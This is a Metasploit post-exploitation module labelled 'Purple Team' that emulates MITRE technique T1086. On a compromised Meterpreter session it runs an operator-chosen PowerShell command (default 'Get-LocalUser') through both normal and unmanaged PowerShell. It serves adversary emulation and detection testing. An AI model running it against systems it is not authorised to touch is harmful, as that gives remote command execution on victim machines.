##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'PowerShell (T1086) Windows - Purple Team',
                      'Description'   => %q{
                        Execution:
                        PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1086' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("CMD", [ true, "Command to execute via powershell", 'Get-LocalUser'])
    ])
  end

  def run
    return 0 if session.type != "meterpreter"

    cmd = datastore['CMD']
    begin
        print_status("Executing Normal PowerShell '#{cmd}' on #{session.inspect}")
        res = psh_exec(cmd)
        print_line("")
        if res and res != ''
          print_status("Output:")
          print_status(res)
        end

        print_status("Executing unmanaged PowerShell")
        print_status("Loading powershell...")
        client.run_cmd("load powershell")
        print_status("Executing #{cmd}")
        client.run_cmd("powershell_execute #{cmd}")

        print_good("Module T1086W execution successful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1085W execution failed.")
    end
   end
end
